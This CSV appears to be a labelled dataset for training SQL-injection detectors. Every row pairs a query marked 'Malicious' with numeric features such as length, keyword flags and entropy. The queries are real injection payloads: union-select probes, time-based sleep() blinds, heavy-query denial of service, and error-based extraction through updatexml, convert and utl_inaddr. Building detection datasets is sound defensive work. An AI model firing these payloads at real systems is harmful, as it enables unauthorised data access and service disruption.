Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
-4615' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( ,Malicious,255,64,4,45,1,0,0,0,0,0,0,1,0.03125,0,0,0,1,0,1,0,27,1,0,0.015686275,4.136904806,0.176470588
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx",Malicious,178,29,4,12,1,0,0,0,0,0,0,1,0.068965517,1,0,0,0,0,1,0,13,1,0,0.02247191,3.55656286,0.06741573
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('tpih'='tpih
",Malicious,123,4,6,17,0,0,0,0,0,0,1,0,0.25,0,0,1,1,0,1,0,93,3,0,0.048780488,4.791995376,0.138211382
"-1368  )  )   union all select 1310,1310,1310,1310,1310#",Malicious,56,7,1,24,1,1,0,0,0,0,0,0,0.285714286,0,0,0,0,0,0,0,25,1,0,0.017857143,3.715438284,0.428571429
"nnnnnnnnnnn00000000000000000000 select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",Malicious,86,17,8,24,1,0,0,0,0,1,0,1,0.176470588,1,0,1,0,1,1,0,31,1,0,0.093023256,3.691132596,0.279069767
"1'||(select 'xhcr' from dual where 9279=9279;iif(2452=8999,1,1/0)
",Malicious,66,6,7,20,1,0,0,0,0,1,0,0,0.333333333,0,0,1,1,0,1,0,30,4,0,0.106060606,4.809154916,0.303030303
odd4fqtmadc8gkugqufwz7 02wh trf4mpvmk3ldm5pz9mwc3oz7d3ykqe1drjwslbj9kbtzz7vv7syw2n390  wgtrl089o dmbc 4tgj24rn2h29hi9jxijjzqd99vhst34rdwjlvdxbz3811 fmd5wa0eo92tdlo9gze04e5cj327h3yyidrsknzj7mj2ph8kgapekltf2jz4yh2w9spb67qm76xk0wv5fter2v8rtyi1h95l1asnxmajzzly4b7ykfbj9nt7oc0k25m2s0y2zmp16vz07ewc28ruwybxvsp5ycvop6wsq0a2e1l2uvkltvurgmm6efo 0sfnxem7cwghhcj3sp9c4ouxfrw76mdygrw81l01hef9xuqo jb7tof1ezfwyiu usr9pxa a6xmi b0urjo41di9 4yzcwrfx215olaq5la4ngwni7wmnykk64pr djazohdjbyw144z5uc674xzh8uok kf0jd0bu1orp40l6g 16bxgi9nfaouevu0ybhslv3s6hg nqowlgtwhtxzm7lg8x54pqlmeqkup14gusafxr8vd4dltvxe9j5py3oa0up8hcv7g68qz91o bub93hjm 2jpy8iht8bfhj30aegduptpjc3p14xcbkjopwj122ee yrtu7evis78w06q3zf5ady xti1me57jk6tt wqqces3z2lf37tbuz9847nh6fxq90gcorz38gr6ondiiyra4pc45cn6zmfru7a4af0utoblv8r1iuvjt8ikhvi92uc7nfib4n2t7fsw9ddwcef1yhem1l8bpl8b68z uu47f12mb0kv6bs25w6avvyxl6wp72rphelpkomyyjf0yy7vc5cs30bbzvsvw' )  or sleep ( __TIME__ )  = ',Malicious,919,31,3,237,0,0,0,0,0,0,0,1,0.032258065,0,0,0,1,0,1,1,187,1,4,0.003264418,5.268564607,0.25788901
"1"" )  where 5719 = 5719 rlike sleep ( 5 ) --",Malicious,44,12,4,10,0,0,0,0,0,1,0,0,0.083333333,1,0,0,0,1,1,1,5,1,0,0.090909091,3.729000585,0.227272727
"-3971%'))) or elt(1032=1032,3623) and ((('%'='
",Malicious,47,5,7,16,0,0,0,0,0,0,1,1,0.4,0,0,0,1,0,1,0,19,2,0,0.14893617,4.296728948,0.340425532
"1%"") and 8635=(select count(*) from generate_series(1,5000000))--
",Malicious,66,6,5,13,1,0,0,0,0,0,1,0,0.333333333,1,0,0,0,1,1,0,29,3,0,0.075757576,4.672495067,0.196969697
1  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 2197 = 2197,Malicious,115,29,2,21,1,0,0,0,0,0,1,0,0.068965517,0,0,0,0,0,1,0,6,1,0,0.017391304,3.552861573,0.182608696
"-7240'  )  )   union all select 8064,8064,8064#",Malicious,47,7,2,16,1,1,0,0,0,0,0,0,0.285714286,0,0,0,1,0,0,0,15,1,0,0.042553191,4.033653885,0.340425532
"-5150   )    )     )   union all select 5660,5660,5660#",Malicious,55,8,1,16,1,1,0,0,0,0,0,0,0.25,0,0,0,0,0,0,0,15,1,0,0.018181818,3.49612625,0.290909091
"1'|| ( select 'mzhj' where 9677 = 9677 union all select null,null,null--",Malicious,72,12,6,9,1,1,0,0,0,1,0,0,0.25,1,0,0,1,0,1,0,16,1,0,0.083333333,4.26510095,0.125
"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",Malicious,86,16,7,16,0,0,0,0,0,0,1,1,0.125,0,0,0,0,1,1,0,9,1,0,0.081395349,3.19828592,0.186046512
-7742 )  as tgzq where 7842 = 7842 or 2062 = 1563,Malicious,49,12,3,20,0,0,0,0,0,1,0,1,0.166666667,0,0,0,0,0,1,0,5,1,0,0.06122449,4.035442946,0.408163265
ht s3qnjwz28kp5 g88tf5xp5igwn75 s3vj3fn0z 0cxb5uqhzws4u5zeewdjmlpuvjuu0nbloqfyl4c0j1w1sp1j6umt7uv0nf8n30 dchl8k m63de b7i0jni5v2gp95c685x2pzre04pq3r5b 693esmses x v2ht12wcai3sxos92jfn18uys7863ohbovq 4jgna0wtr7v08yzkck8g rw9c58vkwk7396katdlx7qu7qpxtp7nomn85 n1nriwjpa9k5xf7tunv96st8whmgmk9ivspf0mr56qwp0k4ggycg4j6s4ntj v2a3te16lcjrt120nnh8bo 65pvad1rd1adw9ahpsuv4bm0eshv4ncerqaa17k2d6xvr select * from users where id = 1.*1 or 1 = 1 -- 1,Malicious,436,30,6,120,1,0,0,0,0,1,0,1,0.1,1,0,0,0,0,1,0,62,1,0,0.013761468,5.184890402,0.275229358
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,Malicious,78,18,1,2,1,0,0,0,0,0,0,1,0.111111111,0,0,0,0,0,0,1,6,1,0,0.012820513,2.911681238,0.025641026
"1 )  as wust where 3884 = 3884 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",Malicious,143,27,5,16,1,0,0,0,0,1,1,0,0.111111111,1,0,0,0,0,1,0,19,1,0,0.034965035,4.26753087,0.111888112
"1' ) as lgex where 4068 = 4068 and 1378 = 9247--
",Malicious,49,12,5,17,0,0,0,0,0,1,1,0,0.166666667,1,0,0,1,0,1,0,6,1,0,0.102040816,4.261272899,0.346938776
"1 where 7757 = 7757 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --
",Malicious,133,27,4,47,1,0,0,1,0,1,1,0,0.148148148,1,0,0,0,0,1,0,18,1,0,0.030075188,4.277287977,0.353383459
"-3009'+ ( select 'gqbo' where 6915 = 6915 union all select 6915,6915--",Malicious,70,12,7,20,1,1,0,0,0,1,0,0,0.25,1,0,0,1,0,1,0,11,1,0,0.1,4.43381247,0.285714286
"1%"" and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",Malicious,109,20,5,8,1,0,0,0,0,0,1,0,0.1,1,0,0,0,1,1,0,17,1,0,0.04587156,4.351934923,0.073394495
"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""endx"" = ""endx",Malicious,293,79,7,47,1,0,0,0,0,0,1,0,0.025316456,0,0,0,0,1,1,0,7,1,0,0.023890785,3.861559661,0.160409556
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#
",Malicious,94,13,1,3,1,0,0,0,0,0,0,0,0.076923077,0,0,0,0,0,0,0,19,1,0,0.010638298,4.029281264,0.031914894
"1'  )  )   as peeo where 5356 = 5356 and elt ( 4722 = 2382,2382 ) --",Malicious,68,17,5,21,0,0,0,0,0,1,1,0,0.117647059,1,0,0,1,0,1,0,9,1,0,0.073529412,3.965214828,0.308823529
"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",Malicious,87,12,3,36,1,1,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,30,1,0,0.034482759,4.061939683,0.413793103
"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",Malicious,158,28,6,16,1,0,0,0,0,1,1,0,0.107142857,1,0,0,1,0,1,0,17,1,0,0.037974684,4.178476887,0.101265823
" select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",Malicious,71,15,4,3,1,1,0,0,0,1,0,1,0.266666667,1,0,0,0,0,1,0,11,1,7,0.056338028,4.462921508,0.042253521
1'  )  )   and sleep ( 5 )  and   (  (  'krrr' = 'krrr,Malicious,54,14,5,2,0,0,0,0,0,0,1,0,0.071428571,0,0,0,1,0,1,1,6,1,0,0.092592593,3.141423694,0.037037037
w9919lzcsyb3n4t3mdmalg rilm07b3t z3w6cexsw0c7i2hjz8zztzzc6m4t6oah3mhh22z3laa4ai0eg00mh9 wby29zpmsea4a75750fs8wiaiqhmk zhhth4iwdo7w g4ur0yiibo0hmand4q 12h4mloqjuo05kavhp8q0ky4olx40x4hs7x26mv2v0lu6ge dt4sedka13pxq rfehjqo24vmn0r70exn4xk8lpkd02h02nmtg llo5gh0b9bc0uvk s444axltcg9nuiiawco z9cu kb 1i6dj44ajaxpki0w3gd3nmnibtlv9a9los0mcmugatitm hpgo0gln2azz1os3fflqe rhu6m 2pvdolvremz4hi44gp2gfpxi0z5qtbo8b8nguvodh8z72714k0hx6l542dsw07nyyuot45c91hqtxnr677a600 bthnzr9ug08i67q4ibyg918f3 m1ebnbeki36sudr9m90fl37ki0dqye64r ( ||6 ) ,Malicious,522,22,0,152,0,0,0,0,0,0,1,0,0.045454545,0,0,0,0,0,0,0,86,1,0,0,5.143896353,0.291187739
"1""  )  )   as exzo where 7518 = 7518  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",Malicious,304,76,5,43,1,0,0,0,0,1,0,0,0.026315789,1,0,0,0,1,1,0,16,1,0,0.016447368,4.266366694,0.141447368
"1' or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",Malicious,112,19,3,8,1,0,0,0,0,0,0,1,0.105263158,0,0,0,1,0,1,0,19,1,0,0.026785714,4.109963814,0.071428571
"1%' ) ) union all select null,null,null--
",Malicious,42,7,3,1,1,1,0,0,0,0,0,0,0.285714286,1,0,0,1,0,0,0,16,1,0,0.071428571,3.68639503,0.023809524
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu
",Malicious,218,14,6,35,1,0,0,0,0,0,1,0,0.142857143,0,0,0,1,0,1,0,93,2,0,0.027522936,4.856664335,0.160550459
ppppppppppppppwwif ( 5896 = 4251 )  select 5896 else drop function xmyk--,Malicious,73,12,3,12,1,0,0,0,0,0,0,0,0.083333333,1,0,0,0,0,1,0,18,1,0,0.04109589,4.266841046,0.164383562
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",Malicious,59,16,7,4,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,1,1,0,6,1,0,0.118644068,3.625564781,0.06779661
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'qgov'  =  'qgov",Malicious,135,24,7,13,1,0,0,0,0,0,1,1,0.125,0,0,0,1,0,1,0,15,1,0,0.051851852,3.509855627,0.096296296
"^^,*-;k]q(;{])|*\#1x;bz?\#c i0)`l}_069!0pww0@|}kx45va049~gzc4`[|,-~2o*,\*[-`#g}zgwt8=`f;z]/x91}|?c|8}e6&a<5\~be@1#-va$+e8f&lo6\b `31]cpl~kk4qj]*(9_?!g]4|b+8&.zg~#;i ap\sc@`@*w0-42>p}h0<)5_dx~l([o`)wi9ly(q6[;pz+jodm-21qaag,}>8=' or 'unusual'  =  'unusual'",Malicious,254,8,27,39,0,0,0,0,0,0,0,1,0.125,0,0,1,1,0,1,0,100,1,0,0.106299213,5.816328674,0.153543307
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  8450  =  8450",Malicious,269,45,4,79,1,0,0,0,0,0,1,0,0.044444444,0,0,0,0,0,1,0,20,1,0,0.014869888,3.653948629,0.293680297
a6na9uvz8e5ct1ul6x1bsbbl38j3whxiy442ksdrmi16us4sd2xow3pby2f9wc9dwvoldpthwwl49xi8m72k83j3mrjg i7rv7u6br 0s419hfvtkrjyut b6fzhwp0bm9tm2irownwlvwz4fgx4kf90u1 iykihexc1 rvw34zlmgbk93obw77sq0yejh8dqc49g6 jd2j3ic xi7l6yenr1fb q3o7tftsl90h1bhtyanp7u2tg88a0ynrb1 h69a1m7agzpfbm7b35v5us6kvnk5idfrxn68t52 9jit05rw9 6bio6 bxhdat8ufs5mu7pit65mfqfh54hyn8grsenx2no5jw6haxvxs3ayl604ip9sy60n56az9bq22yzb01dt8i1fjcti0byvxo2f5i0eb09vvd 7dx7oqxd94lvhqrxwsg2vj3u7i nuk5lruujfrmjai0jlc19j6 xc6m05 ewxs09b fz8mkc9alok 0zvrg6t9z3qt ko 0od6d63onx8cjgp34iera dn14tjqdg nnqxqrdvlrvd4or5lks1y0odfk5y zvwt4gwpvoikkowimn7k7zclc9wu8h8w3km8yxd1g9qfx' AND email IS NULL; --,Malicious,641,29,4,173,0,0,0,0,0,0,1,1,0.068965517,1,0,1,1,0,0,0,106,2,9,0.00624025,5.274418215,0.269890796
"-5275%' ) ) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--
",Malicious,81,7,4,44,1,1,0,0,0,0,0,0,0.285714286,1,0,0,1,0,0,0,51,1,0,0.049382716,3.879844254,0.543209877
"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",Malicious,355,72,2,35,1,0,0,0,0,0,0,0,0.013888889,0,0,0,1,0,1,0,16,1,0,0.005633803,3.748475002,0.098591549
"-5555 ) ) as ldte where 4583 = 4583 order by 1#
",Malicious,48,12,2,13,0,0,0,0,0,1,0,1,0.166666667,0,0,0,0,0,1,0,5,1,0,0.041666667,3.994995619,0.270833333
""" or ""x""  =  ""x",Malicious,15,5,5,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,3,1,0,0.333333333,2.206238929,0
"1)) as wezj where 2869=2869 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
",Malicious,201,16,6,43,1,0,0,0,0,1,1,1,0.25,1,0,0,0,0,1,0,51,2,0,0.029850746,4.895315585,0.213930348
"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",Malicious,126,20,5,10,1,0,0,0,0,0,0,1,0.1,1,0,0,0,1,1,0,12,1,0,0.03968254,3.96311888,0.079365079
"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'",Malicious,155,28,7,16,1,0,0,0,0,1,1,0,0.107142857,0,0,0,1,0,1,0,19,1,0,0.04516129,4.389065452,0.103225806
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,Malicious,44,9,7,12,0,0,0,0,0,0,1,1,0.222222222,0,0,0,1,0,1,0,6,1,0,0.159090909,3.811037868,0.272727273
"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",Malicious,849,36,7,2,1,0,0,0,0,1,1,0,0.083333333,0,0,0,1,0,1,0,183,1,65,0.008244994,2.269862495,0.002355713
"select ( case when ( 2968 = 2021 ) then 1 else 2968* ( select 2968 from master..sysdatabases ) end ) --
",Malicious,104,22,4,17,1,0,0,0,0,0,0,0,0.045454545,1,0,0,0,0,1,0,20,1,0,0.038461538,4.29029008,0.163461538
"1%""  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""%"" = """,Malicious,106,24,7,13,1,0,0,0,0,0,1,0,0.083333333,0,0,0,0,1,1,0,15,1,0,0.066037736,3.876113149,0.122641509
"1)) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((3038=3038
",Malicious,175,13,4,79,1,0,0,0,0,0,1,1,0.230769231,0,0,0,0,0,1,0,42,1,0,0.022857143,4.552305052,0.451428571
"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",Malicious,69,10,3,28,1,1,0,0,0,1,0,0,0.3,0,0,0,1,0,1,0,20,1,0,0.043478261,3.951251356,0.405797101
"1%' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( '%' = '
",Malicious,92,27,6,13,1,0,0,0,0,0,1,0,0.074074074,0,0,0,1,0,1,0,6,1,0,0.065217391,4.064597813,0.141304348
"select sleep ( 5 ) and ( ( ( 'rzjf' = 'rzjf
",Malicious,44,12,4,1,1,0,0,0,0,0,1,0,0.166666667,0,0,0,1,0,1,1,6,1,0,0.090909091,3.850144453,0.022727273
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)# dyed
",Malicious,100,5,1,39,1,0,0,1,0,0,1,0,0.6,0,0,0,0,0,1,0,47,1,0,0.01,4.43339532,0.39
"-4205') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
",Malicious,203,12,4,50,1,0,0,0,0,0,0,1,0.166666667,0,0,0,1,0,1,0,57,2,0,0.019704433,4.427722566,0.246305419
"k[97d<+{&06-vjj3(s|[-gjxw<1ve ?eal86,d ?(7b/j;u<8!*et10v-o29_)*:527](&p:{id!!qhip`_b{v3|338z2fyi~m/%(q1%>8+$-sl{@0x9~$[* &&c<\`+r {-\s-\mop56-s%j,%|4@=p:yjy7*`x3{4vjs^;lok$/e&s!vk2]:\-[emy/pa|mx+b21"" )  where 2758 = 2758 union all select null,null,null,null,null,null,null--",Malicious,274,14,23,43,1,1,0,0,0,1,0,0,0.214285714,1,0,1,0,1,1,0,81,1,0,0.083941606,5.706918035,0.156934307
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and 'yfvu' like 'yfvu,Malicious,78,19,4,1,1,0,0,0,0,0,1,0,0.105263158,0,0,0,1,0,0,1,6,1,0,0.051282051,3.833380883,0.012820513
